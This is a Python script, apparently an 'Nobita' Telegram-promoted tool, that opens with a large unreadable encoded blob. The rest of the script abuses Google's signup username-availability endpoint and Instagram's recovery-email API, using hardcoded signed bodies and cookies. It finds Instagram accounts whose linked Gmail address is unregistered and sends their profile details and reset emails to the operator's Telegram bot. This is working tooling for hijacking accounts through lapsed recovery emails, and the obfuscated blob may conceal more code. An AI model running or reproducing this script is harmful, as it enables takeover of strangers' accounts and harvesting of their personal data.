HY$Y*FwOy?M}b2ZAkORWIpo|fZY)2ZAiK<;Y*=;ZAyR~fF_6X)OMKDFXQ;6FZmpN0JakGBGH%PgF>b(*XtL9BGLYqgFX04CGMTE=XA((eZYe3CGTzh*FI4KfFLP%)FC*#$a6;79bPhwwIQp~oW;nFxa0KlsCIn+BGa__cGdO0#HfR9aHJrspChtk4ac2e=M>{-sCZE}vJAJV#a?zvwIKUQ=X9h4>X$t^QV1V=kNkkJGE0O&kNrrspC^b#CRV>V>X1S?eZ^ckkEM9?SS0ZfeFkE~-W~K9*FpBU>V^QjcG6V0aH5ks5I_o5&Geg)kFf_q*Fi2v-WZqz%G21-BGGd!PVkUacGC=M>V;A2uCFH|nNV>V>X?QL%RcZ<)Zq<>SS0ZfeFnqtzQ@PlDZs@fQVGuUmE0SH=X1ryQV0V=kNkkJGEEqvwIAzg1b$v0VL7a**Z9M9Zb~#rOW#>akEM9?SS0ZfeFLDl)FBrspCnd~FO7Y2oW4E0fXFpGWcX%bSL$cElEesCoC7MrhYLhvwI1Y2oWA)@YZ6b~{V7dF*Z1V=kNkkJGEW&EXIaU(8HUhufFLlwoCq7lDZM~ggZ<<B{V32CmE01vJX#U?SS0ZfeFCoPXIf3`BGgdNoE0A05I?F#hGW+3dGRSc)F8QU>V*o9pCFH|nNV>V>X=2P)QRd8pW^D_lEulo$J5)yMWK8s%IKIP33r3$waXpO0DLRF%a`UyMWXD04atD*8J7%V7Zt!sPVWYe7bwOGJ3oIwBa@T|*Fv`f=X0z!KX*VCGD_CDDZEH2>X$JSuU-w}kXU-2>X~Y2ZAN4|6ZOJX%Y=6iKXt!W=X1FmtICsF*ZHRF%aOzcZA_CDDZ0gW=X0Otycnz2KD+nOMWV_TRVX(s&axApnWsXt&axApnW$QEDF_CDDZ1mB+Z1F%0dJy2+Z*zgvU1Lg7bm`ggZ1cF`Vut=}bL_^QVQId{VQ*#$a6;79bQAb)XC|=2bNUomXt*59biar1bOsB!bnAu#JCsF*ZHRF%aKy($G?eMYZK{u&aA#%0d&b2JX^z2JXx;&JDAlFQVq+upCSpB!bf9pGWy1X`V~_yMWloE=Xyz7=XI)CuChY-#bloE=Xm7KGEvn2(I4nBNWnsCoC@^)Bap;eiOQ0a?X}E|WI)C(9Q7*CTd9?TEHqZ9eI?eMYZA{=Zb5w>{VgS?0DS8~!bRGD*Zm`5oCi?(-W~@x8H3W!=VkeilV8};PVn*5CGdJZlV_SlfFUwhBGGs&bI}6wZH5QvHW}3jGG9F+eHqt`=V2^2HWErspC5)BsV&U?eZM0$vCvSVYbf}GLeeoClM6sjUb2bCRVd3N0J;a9)Z^gM-Yj?p7ZW_NoE!Z8qEmJD*Z@e|_VCsyBa#rspC^b#CRWp~oW$<LvLwl}9YwD#8Sd55HOS>)=Oh>0Odsf9*YCT8eax*mBPZ(nvJ4_;)ZM>=8bF)*&Pu+KRL;&(DZ5oh$H!h7&ZC@0PLHjN|M~>7zJDn9vCmuN=Xu?LvLg+vzb)LegZx2SkE>!ZdR}<J3b;`sPVoIZLD#xcHWjQH_EEZ-#bjb89byY-#b0Ra*FyVE@CADvJX1$4qW!>dJDCa9)ZG_f@E4)<$GEZ-#bSWl!bl(Eabr&lHWIy{<X~9LRVQo*pWQWF=Xyz7=Xc^i7JY)E=XA((eZyID0ck6ZLD4w=JX_|S9J(}5MW2inDX2FO*Z06eQV`gZKXX)MLD_CDDZ7g0{V{7*YAwz?S3|&GUb7R=wc?WCGDa%yBaQ3yuJDkFQVz!sPVWYe7bvF=?22u;JXBnpQVFXg7bF_C`Vm*0fZgB-nC4iNSbF{u8bGkFQVY+XFXHNlDZ|vZpWp|bjW^_w13*VCGDBf`hW5RB&aXpO0DY>V$Z4St4JD4OqCT~w-Yew6cYcW<JXBnpQVFXg7b*Z`6ZOJX%Y=6iKX~=3%Y;<=oW|(W&I_CDDZ85K>XTr|fZ=-y+Wl^+?2XD04atD*8JDYO1b_31231FmtIcQ5qWc}d7bN5v8bT|uwaX1kXZ(iNHEMQyzbUh=4B00A23;jQJVY~D!J+nOMWY;ZpW!q}kXp;ZpW!q}kXPUQ=X3Pd{VgUQ=X3Pd{VP6qQVi-b#JA+#$abJFoCP0x-Y)(++Y@6mRV@XeeZMBr#bk@pgZU;PLFMD4*ZEKK-Y3z!KXl`ggZ1cF`V_CjxIYfZabe804anhe7bN5v8br+F0B?z@bZn~CpVtbY=X1l#jW#nQTcJ74TC?gM>X<R(eZxzD*ZA<ZpWJap*Z1ziKXQ7f{BY-D{BY-D{BI&pgZ7;Y$Y!3DvLHDPBG4KD{BXoo(FWfNeF7;Y$Y!3DvLY{yoLmY}-Y4{BDGU==!b9;D{BI&pgZ7;Y$Y!3DvLc#EAHN1f{B7;Y$Y!3DvLHDPBG>z@bZn~CpVtbY=XOVQBGL-D{BI&pgZ7;Y$Y!3DvLmY}-Y4{BDG4KD{B~pQBGL-D{BI&pgZ7;Y$Y!3DvLmY}-Y4{BDGU==!b9;D{BI&pgZl|ZtJ3kM>X}c=4c0{PhW|h^?WUCM-Y>y(>XnUQ=X3Pd{Va>;5IY?hBGUk})Fo#IeGdN==Fte*rL-z1lWPy2%H>uN&Z_^iyR~_&WbUo{PVqlZwJXJiSChShzHro3pLW*goLmY}-Y4{BDGX&9DGW#9DGW#9DG4KD{BAlFQVho9JGYU9DG4KD{Bl7tvdxfHeOpKD{Bl|ZtJYj=^EJxhEZW0>oWQMk$YWrA#J}c=4cS$aUC+zqKXU8B|c*I(QMFY8^W1nO9ZruZkMZBdlMJ1+sMj72>X-AdDGGId{VICZKXV9y@E_CDDZv*OkMXRIeGeP~Zbgz$jWNsKZbElc4BaSVYbf}GLe&UvpC(&Zndg6qQVgr)8JnwjkVm?upC5}uJXHWXpWynKGEhVmZb4d^7RP`D{BZ`D{BJ{D{B_CDDZB{z6ZHfDiW8OO*ZMZ2>X-AdDGO`D{BDrs0bNUomXnipgZHvF*ZAB2>XS?$jWBE~&aeL}jW5RB&a96#pW3wE%axz}}bk@pgZU;PLFP+N@E}>a)ZZ9r1bT{^*Z2VWJF@51CaU7~4Bw@jwa^0U@WheKGEIId{VICZKXV9y@EXQ8#b&)jPVC|=2bNUomX?eMYZ2Fp%a#sCoCFrspCQ@nyck`ggZ1cF`VBHK-Y3z!KX8M34ITb8aRrcg7b=Py`VKPyMW{0~oWi8>pEBzZ^W!LxXc(KCZZ4JURV~KOBapUxwIXSn2dleegZDvF*ZpsCoCggouJho|oW2!cmErgxwI0D|PV2!yQVfw9Cau)jPV_%mkDGYvwIS#HpW_h+tCm<3*ZEKK-Y3z!KXl`ggZ1cF`V#rspCVsp%aNQ!#b%lo$J5)yMWLH{7Jg2z*ZTrtzQ69{kE=m;NNCFandgUQ=X3Pd{VGHEDF;hNSbF{u8b_kkUbY|ENE;y=?2;SFQTgMgpWEvlZbF{u8bv>EGWIj=^E#nqvC$QuycknjZbZ@{oWt2{#Zl#HpW=Ux13>1KkFWf{0b~&w-YGLOBa;&C@C;vE%a+Pjwa)qESbo+X%Yo>UYZjPT#J$yO(ax2DJ3Ig)ODCN`?CGLOBat~+$Y;<=oWjb89bVkFQVaCv&Y;<=oWVdwuCt!W=X1FmtIKIP336Z@>XLT2>XzG6MW`G?#Y=&R;YAGmtIBkFQVI=#$Y=6iKX!h*nW|o}*W|pFGDW%lZbT!z$Y*sZLDRPegZnAg&I5mIRVI>V>X3rX`V|1bRb7R=wc?WCGDLuzOeL|4mX2M?Jefa17BJ=&YbiTZ_Edv9ZAbf;nC-sCoCwT8_EmA|?C9OX*ZH2@>X!2DJ3e#W*Pg0+Sbr92rUBF)ODKL8=X;OrpWPfgpW9aO*ZL}d7bN5v8bqukUbnl{7JIg)OD(H_?CGLOBamZm<FZ+1}Ab==!bv97nCT~w-Yxw2KDSy*YbWWXgZE+ipWi(Eaby9kZbwqUYbFDfLVHG#ME5)yMWNZo!J5)yMW6qENE3VViYgZ5!J3VViYPqsMER;4>X=<yMW10F*ZH6kAa=nOMW3I24ck@pgZU;PLFMD4*ZEKK-Y3z!KXl`ggZ1cF`V_CjxIYfZabiiNSbi#u^EM|ipWKLF%alWXgZE+ipW|6)wC(GuAGb==!bUu}-Yorn}A1xNHErt}-Y&RwAGb==!bUu}-YdeF%Ydp*NEI&pgZHY&LEI&pgZ6!2pNz>y)Qml;>W#dd1Bb==!bUu}-YdeF%Ydp*NEq*G2Bb==!bUu}-YdeF%Ydp*NEI&pgZb==!bhCxwIM*0fZ+z7=XI)CuCtDm<FHY&LEst}-Y$94fFqjN#b8O^7bKgw-Y7LwnWo&C%Ydp*NEI&pgZE@1fF}TPJGubyFE#lUZZ%_k}A)p}ud(IhIezH17BtXekYia17BZ$X%IRKF%atZandV_TRV+ObSD4w=JX)LegZ6P#nEMBr#b!}LYZe=lDZJ_jUCZfNeFJ)NtbA;Y$Yfn~rMq(3*ZEKK-Y3z!KXGkFQVB{D{BqOx_KyR0Cav`o!J86N>XBMd{V8kFQVU*V`VD|ZpW$9fgZ1cF`V-6URVL3pJF;W&4aASi=XgD4*ZEKK-Y3z!KXl`ggZ1cF`V_CjxIYfZab+rspC5VZpWG(svCm<3*ZEKK-Y3z!KXl`ggZ1cF`V_CjxIYfZab+rspC}Ci=XrVKGEFtvwIU==8bu3OabChd{V2T4iW8OO*ZtsCoC0dN7RN7qpW5`lkXJ>?nW`pweZFQi#bdxp*ZjsuXc?6*LFHvKZb*Xw-YK}+tCtYhAawp-SbCdggZc`JGEKVKfF3;ZaZwc}ZReFMuCkcsJX29AfZQR-Sb-7F`VnsCoC0&_nC+d9Cau)jPVz=_6ZHfDiW8OO*Ze6OabChd{VcUxwIfr@>XKpBZbaLandp;ZpW!q}kX>+89bv_upCi|p?Ml1z*ZkJqtCy1hpW9aO*Z_PTAGe1_*ZnM2KDSy*YbungpW%UPMCM7F-E-5)*ZvVBGEI&pgZb==!bUu}-Y>Nl1JWHmdaEVBnD6?PUbdFJUCb==!bUu}-YdeF%Ydp*NEI&pgZb==!bUu}-YdeF%Ydp*NEI&pgZb==!bB4i<Ex)cLVIP5oEL6spWPjeQVBISfZN%UYbLl{?C=<BRVN4EiWrh-)ZCZubGfHJ3b;`sPVX`EoCbV@YZY-ylXGL8KXlTW`VD|ZpWd*O(a=YUScJ74TCuPqKXloxnW!gw-Y2=lDZ%{A+Zs@T|cJy2+Z>UZpW5RB&aeTiLF+ECZZ}Ri=XgD4*ZEKK-Y3z!KXl`ggZ1cF`V_CjxIYfZabiiNSbP9r1bOsB!bnAu#JdQF%aBwgJD4w=JXjb89b)LegZ6P#nEMBr#b1i)(F)ry+WsTHqEXQ8#b&)jPVHCZKXOVeuCEATjEjdlyJL*u&aJ{Z7J;a9)Z^gM-Yj?p7ZW_NoE!Z8qEmJD*Z@e|_VCsyBa#rspCP-`abWp~oWBMd{V64YYHD0mXaH!cmEtjN!HD0mXaxy;MEfgouJ-m`lNjy;MEggouJhcARV<)ElErUxwI0D|PV2!yQVfw9Cau)jPV_%mkDGYvwIS#HpW_h+tC{fviW>TeJDE}fHE1uswaIgsJXD@YaACB`&XJyZ^W)7z0D81XYZSR2^E00iUbnl{7JAYmVI_zswaIgsJXD@YaACB`&XJyZ^W)7z0D81XYZSR2^EJ0eCG{TeJDQ<_YHrT|~C-zyQVL5K>XS6*vaZU0`cJ_C`VQ8t)ZyjqnCxer23SO&{c_*GJ3@!z$YIH~*W`XkkC0SH|VgZ&8b*_GlX50SEZK&l!bR?ZpW$vttJRH(|aOsB!bK4ZaAS&pBa9x|FevSVYbG9t)Z;XbT3!ng=X0z!KXvd|&Y&J|uUobwS3&(gKXo)sqV$HH3b`CST3x7fQVDIqU3=jj$aP$!aAgs0Q3a!9RV7}3uCGE$;YXHESb;A>sJm-kDZSUr1bAgW=Xd|z;YW&37ZS7@2dlkw*ZA<I}AzwkkNCxF7Rp8Z?CU#6gZy;zUA=jj$a3azU36t&Yb+aw-Ysg4EFP+N@E`I~kXMVzQVGpBZbzE<MdKtXBYC|=2bNUomX=-zUA}~XsU%hMqU!ugR3OTMXc{V$qVS(cRbLa$EZ+5kDZDm*Yb5AcRbLa$EZ7;kDZDm*Yb}VI6Z|RAT3h+iaAS&pBa~r&|aOsB!bK4ZaAS&pBa6W1JdfqHaAS&pBaL{wzGR0LRVKb#&aC+D>XWL;RAkr{oW_NIXAM_?>Xej17BZ3y#bm)x!J4_;)Zga`<X~9LRVQb#&aC+D>X4xp*Z}a-+YYb#&aC+D>X@Vl!bdb#&aC+D>XlV~iW2&xYAS&pBa34{_AT;tEZK<ZpWq+}9JndMdG~FE+WsND`V?_grVH|FGDL}fHEFZ0^C6`BNWRX=^E5w(eZhB{#ZSQv&a&U<T3X-<?X^DL9H2LfQTs>T!J-vWYb~~{fZ+gPgFHla^C6`BNWRX=^E5w(eZbg3+X1w^6ZcF`*FIvjrcxsaOdh^F*H`HNQTJ~DzT!p(Yb}E_U3`=#cGgm}pVj?PtCy8lkCoFfQTJ~DzT7n}pVj?PtCno}0d2w^6Zdp52JndMdGIvjrc-?C+FFw^6ZdgE2JndMdGIvjrc-?C+FZpkkC1c})Fv~E6IYUA=FvgttJTmFGDl4FpWU;}^E6pKZbV^HAQV2N>XM3GGDXC=PLw?OSbGv^BaRlPbY!e*rVt?%eZK_4LXz%sqVb}J-YMsF*Zy0iUbR+{MEMX~JX$NutJ1kw-YU(s&a4Gd{VU4l#JNUS;Yc%EoC9n+7H$y;Xb}DbPV5b?(ZzHiXZ(mCWAnnsCa?_grV!+6VAc*#$a<_%oWMQswa;3~oW+sIAQRlPbY!e*rVt?%eZK_4LXz%sqVYc0{VG@_tCwuF*ZiZjwa3q~oWsVpaZ<tgQVi@p*Z<1@tU?_grVvZJ3bJU|)ZOq9JV5b?(ZGQswa;3~oW*v#6RfHSEPytWHEosr+O)(QeQkX+rLL8OBaRd}^E5w(eZllJ3bJU|)Z)g;bai@p*Z<1@tU?_grV*e%?T3>{oWHeeuCwm9+ZD*Y1dCHX`TMQggZ+6DDZq^5GW5dJPTg>&_cDeeuCj+&YbRLFwCCOWtC2hi|Vr2XhWM@_tCCOWtCE(svCfkUYb-D|PVSg$LEMn9+ZD*Y1d!}LYZ_m4LXRBHzJosr+O)(QeQkX+rLL+r9bX`p*Z{UbT3GpBZb3#vBRX`p*Z{UbT3Ok5NEVbB0bKk59bVkcRbLa$EZSnNabL;ldaG=I6Z|RAT3{SKZAK1cRb-D|PV0Xg7b4+)Yb|;?eZCJcRbLa$EZN1egZuowtUMBr#bQ)K&a;BWpW0CF%aX`p*ZIxcZARvF*Z2TI6Z|RAT3klvCaX`p*Z{UbT3M|ipWKLF%aX`p*Z{UbT3ZhB0b^HsJX{98OWPFKOE5}A0b=&U`V_(y`VX`p*ZIxcZA5w(eZC=I6Z|RAT3;vE%a{kbRbLa$EZA87fZ#ApnWQPraAB+!^W+ZD>X57URVMb#&aC+D>X7aD>X57URVCr3*Z0adtaLNC+Z-AynWfb#&aC+D>X23ZaAS&pBa0#8Pb2yu8bNPcRbLa$EZ#a`<X~9LRVQb#&aC+D>X>Q&NWD@YaAS&pBaL{wzGR0LRVKb#&aC+D>X@Vl!bdb#&aC+D>X6`l8bSb#&aC+D>X+ZD>Xcb#&aC+D>XDR8aAS&pBaA(FGDigR+Z!FqVAOmM>XQN>&aW!|fZT?cZAL8>Zb_LFQVBmwTo<OWNMD*N=EuRIsMivt}CKap%a=C|vJ=`}vJ=`}vJ=`}vJ=`}vJ=`}vJJCpOB|zxiO<uvdOJCHXAVve(PNPPgP{v_L3=`}vJ=`}vJ=`}vJ=`}vJ=`}vJ=`}vJ21NJ3;b04a0aK8bPizXZJ}=>X9HvgW{3M-YYNo-EacO*ZYM{!b49F%aZqf#bRfQCX;7tPV7kMFf)O$tZK;8~KmTCiW^_!qdb#PSbGv^BaOTweFfMixcH+q1bb)rRAmlRAGE+2oWW#uRAUGDGDt{{8bu)jPV_LFQVT}m*ZRnsCa?_grV!+6VA3wWYb%6YVAC+P=Xu(gVA5!X`V{Z73j&6A1Mh=CiW^_!qdb#PSbGv^Bah(rRAE-?nWC<#$a3y}8bu)jPVTr|fZ_8bT39}K&aSw3_cBoE3aJSiaAUyggZ4d^7bk?rRAE+9Aah(rRAh(rRAVo0ZAEWjXZJ*BCanR;RML#HpWC)2ZALdqL3_vE%aO)rRAh(rRAh(rRAW<I}A{d<nC=4EINaBf1C&LThEZR_?C6pKZbMc89bLaD>X57URV52Q(aDF5qWaxC*Z7&E%aDF5qWI>V>XMgp%a4a*zbcqf#bWN83j&6A1Mh=CiW^_!qdb#PSbGv^Bah(rRAh(rRAh(rRAh(rRATXe7bILuRAh(rRAh(rRA5lOeW7XIXAd^>nWC<#$a3y}8bu)jPVh(rRAh(rRAh(rRAh(rRA}uI3sIW<va^fRXAFC1EZ;8(WA`Id{V<BjXAA~)Ybq3;{MN^ipWehFVAj&3deh2kbQ@<C%a}(~6BSPegZNVHaAh(rRAh(rRAh(rRALdqL3XaD>X57URV52Q(aDF5qWF)rUA6pKZb=nOMW|p~oWJ+8|VGbcZAh(rRAh(rRALdqL3e?JPcS=DiW6trpW5^@YAm-kDZDm*Yb)mEYbE#l&aPFuRAh(rRAh(rRAUGDGDagewIT!^vIi_ShEP`GuS!BdFEFSqvU6pKZb*6URVABlDZMBU&ac4EiW6trpW5^@YAm-kDZDm*Yb<8%0dQWMycR)rRAh(rRAh(rRAk$FUb^bOvU=jj$aP$!aAqsA?LvfW=Xh(rRAh(rRAOZ9AGc?PBG1i5(FStPgFQhufF`QdFEfqDiWk?rRAhec>XpB~^EE(9Aa*6URVt;zUAFSqvU6pKZb*6URVQ)rRAh(rRAcgB@CM8Habp_#&a$P6MW>CZpW+>@sJJdCRV;nG=X0Xg7bh)rRAh(rRAlc0)F=}HGEj$=>Xf~}^E~&w-Y-zaRb^bOvU=nOMWp;#&a$P6MW>CZpWf*uRAh(rRAl~mtIhtraALdqL3i>?eZ)D6MW3I24cOzcZA~&w-YJyZ^W&wc7bq(yVAd^>nWC<#$a3y}8bu)jPVPc0)FfMixcH+q1bb)rRAW<I}AW>V>X1S?eZCT*YAGdB&a73N>XY7_*ZJI0{Vn+XVAb^ipW;%oYA-w}kXIP;Zb1CM-Yn(yVAkYpzp#6A1Mh=CiW^_!qdb#PSbGv^Bah(rRAYpD*Z9$HpW$bYVbL;lda4Vq1bOsB!bK4ZaA3rX`VHtFGDQ>?eZ9F@>Xf~}^ESy*YbWWXgZE+ipW*;zUA6hM>X)nG=XFG-aALdqL3w{o#bJ;79b|yZ^W?;(>XI1EiWNspBaM4ZaALdqL3nas&adKH_E2oK>Xh|YiEKXg7b@nG=X`_b!ZcrQ(aPM(%aNm<)Z4t9;YOD4*ZVhegZDvF*Z4Xg7bB(wmXU?x@EbgGLF@51CaU7~4BKFvJXqe89b7<QpW*;zUACsF*ZHRF%ah(rRAmxO(a7aCGDVfp%a#w2KDvw1OMPBc>EuRIsMQd>^L%@WpW1;H6Z>3LoW+^HXAc-e2dNf*Ybpi9ASjXCNMA=C%a}(~6BZ3y#bJ!cZA$wkkNA<I}A83MNM~30(QCB?NMzVEVAVve(P~}MmN0zlWAX!mS@CqU@MCd#<ELx`ab*eMJPC&;<EuRIsMivt}CKap%aXhB@C`3M-Y>ZCGDBqpnWNvYSA0b&oWgLegZN^|vJ~mpQVgkw*ZGbcZALIC{VY-;oWg-r9bnR8aALdqL3}Vswa%zB{V`UyMW@{nhWaddyJ8bipWXl!#bI%=>X%gPJ3BtM>XUDK-YCX9XAUZp*Z@a#&aC+D>X`apQVJU|)ZBr3*ZPOuRAUGDGD2bpQVJU|)Z7K}-YD^XgZEHc>Xj&37ZS7@2dlkw*Zh(rRAfBACa{y4qW1HSfZR|@hW3Q?*Qa(C%a=4bRbLa$EZ3mADZ5US;YBTI6ZJuBZALdqL3*tHab#}DpWGViaAS&pBa7yugWMSraAB+!^W+ZD>X57URVMb#&aC+D>X7aD>X57URVCr3*Z1j&|aXb#&aC+D>X'))
import requests
import os
import time
import json
import uuid
import base64
import random
import hashlib
import inspect
import re
import webbrowser
from datetime import datetime
from threading import Thread
from random import choice as cc,randrange as rr
import requests
import pytz
from cfonts import render
from user_agent import generate_user_agent as ggb
from requests import post as pp,get
import Topython
import sys
COLOR_COMBOS=[['green','yellow'],['magenta','red'],['blue','cyan'],['white','gray'],['red','magenta'],['yellow','green']]
nobita_colors,qe_colors=random.sample(COLOR_COMBOS,2)
NOBITA=render('Nobita',colors=nobita_colors,align='center',font='block',background='black')
QE=render('Telegram: @nobitapy | Join @nobitabout\nV5.0 ',colors=qe_colors,align='right',font='console',background='black')
print(NOBITA)
print(QE)
time.sleep(1)
c1='\x1b[38;5;120m'
j21='\x1b[38;5;204m'
p1='\x1b[38;5;150m'
cyan='\x1b[1m\x1b[36m'
x='\x1b[1;33m'
white='\x1b[1;37m'
z='\x1b[1;31m'
bi=random.randint(5,208)
nobitacc=f"[38;5;{bi}m"
meerssmo=random.randint(100,300)
nobitacc2=f"[38;5;{meerssmo}m"
import base64
import uuid
import platform
import hashlib
Token=input(f"{white} Token : ")
import base64
import pytz
import requests
import sys
from datetime import datetime
import webbrowser
WEB_APP_URL = "https://j4iaz.pythonanywhere.com//validate"

user_id = input("ENTER ID :")

os.system('cls' if os.name == 'nt' else 'clear')
ID= user_id
total=0
hits=0
bad_gm=0
bad_mail=0
goodig=0
infoinsta={}
import requests
yy='azertyuiopmlkjhgfdsqwxcvbn'
def tll():
	try:
		n1=''.join(cc(yy)for i in range(rr(6,9)));n2=''.join(cc(yy)for i in range(rr(3,9)));host=''.join(cc(yy)for i in range(rr(15,30)));he3={'accept':'*/*','accept-language':'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','user-agent':str(ggb())};res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=he3);tok=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2);cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn','user-agent':ggb()};data={'f.req':f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'};response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data);tl=str(response.text).split('",null,"')[1].split('"')[0];host=response.cookies.get_dict()['__Host-GAPS']
		with open('tl.txt','w')as f:f.write(f"{tl}//{host}\n")
	except Exception as e:print(e);tll()
tll()
def check_gmail(email):
	global bad_mail,hits
	try:
		if'@'in email:email=str(email).split('@')[0]
		try:o=open('tl.txt','r').read().splitlines()[0]
		except:o=open('tl.txt','r').read().splitlines()[0]
		tl,host=o.split('//');cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",'user-agent':ggb()};params={'TL':tl};data=f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&";response=pp('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
		if'"gf.uar",1'in str(response.text):
			hits+=1;pppp()
			if'@'not in email:ok=email+'@gmail.com';username,gg=ok.split('@');InfoAcc(username,gg)
			else:username,gg=email.split('@');InfoAcc(username,gg)
		else:bad_mail+=1;pppp()
	except:''
def check(email):
	global goodig,bad_gm;ua=ggb();dev='android-';device_id=dev+hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16];uui=str(uuid.uuid4());headers={'User-Agent':ua,'Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'+json.dumps({'_csrftoken':'9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','adid':uui,'guid':uui,'device_id':device_id,'query':email}),'ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
	if email in response:
		if'@gmail.com'in email:check_gmail(email)
		goodig+=1;pppp()
	else:bad_gm+=1;pppp()
def rest(user):
	try:headers={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB, en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding':'gzip, deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}','ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).json();r=response['email']
	except:r='bad'
	return r
def date(Id):
	try:
		uid=int(Id)
		if 1<uid<1279000:return 2010
		elif 1279001<=uid<17750000:return 2011
		elif 17750001<=uid<279760000:return 2012
		elif 279760001<=uid<900990000:return 2013
		elif 900990001<=uid<1629010000:return 2014
		elif 1900000000<=uid<2500000000:return 2015
		elif 2500000000<=uid<3713668786:return 2016
		elif 3713668786<=uid<5699785217:return 2017
		elif 5699785217<=uid<8507940634:return 2018
		elif 8507940634<=uid<21254029834:return 2019
		else:return'2020-2023'
	except Exception:return''
def InfoAcc(username,gg):
	global total;rr=infoinsta.get(username,{});Id=rr.get('pk',None);full_name=rr.get('full_name',None);fows=rr.get('follower_count',None);fowg=rr.get('following_count',None);pp=rr.get('media_count',None);isPraise=rr.get('is_private',None);bio=rr.get('biography',None);is_verified=rr.get('is_verified',None);bizz=rr.get('is_business',None)
	try:
		if fows and pp:
			if int(fows)>=10 and int(pp)>=2:meta=True
			else:meta=False
		else:meta=False
	except:meta=False
	total+=1;reset_email=rest(username)
	if reset_email.endswith('@gmail.com'):email=f"{username}@gmail.com"
	elif reset_email.endswith('@a**.com')or reset_email.endswith('@aol.com'):email=f"{username}@aol.com"
	else:email=f"{username}"
	ss=f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❖───〔 TOOL BY NOBITA 〕───❖
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Name      : {full_name}  
🔖 Username  : @{username}  
📧 Email     : {email}  
📈 Followers : {fows}  
📉 Following : {fowg}  
🎞 Posts     : {pp}  
📝 Bio       : {bio}  
🔒 Private   : {isPraise}  
🆔 ID        : {Id}  
📅 Year      : {date(Id)}  
🏆 Meta      : {meta}  
🔗 URL       : instagram.com/{username}  
♻ Reset      : {reset_email}  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 TOOL BY @nobitapy | @nobitabout
""";inline_keyboard=[[{'text':'Developer','url':'https://t.me/nobitapy'},{'text':'Join Channel','url':'https://t.me/nobitabout'}]];payload={'chat_id':user_id,'text':ss,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})}
	try:requests.post(f"https://api.telegram.org/bot{Token}/sendMessage",data=payload)
	except:pass
def pppp():
    os.system('cls' if os.name=='nt' else 'clear')
    print("🔥" * 27)
